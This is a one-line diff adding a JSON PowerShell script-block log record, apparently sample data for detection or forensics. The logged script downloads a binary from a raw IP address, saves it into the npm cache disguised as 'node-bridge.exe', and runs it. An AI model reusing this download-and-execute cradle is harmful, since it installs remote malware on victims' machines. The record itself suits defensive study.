@@ -1,0 +1,1 @@
+{"TimeCreated":"2026-03-09T14:00:15.600Z","Computer":"DEVBOX-07","ScriptBlockId":"6e3b798a-5db3-9fc2-0bc2-09758dc05565","ScriptBlockText":"$w=New-Object Net.WebClient;$b=$w.DownloadData('https://193.42.33.81/u/nb');$p=$env:LOCALAPPDATA+'\\\\npm-cache\\\\_tmp\\\\node-bridge.exe';[IO.File]::WriteAllBytes($p,$b);Start-Process $p","Path":"","MessageNumber":1,"MessageTotal":1}
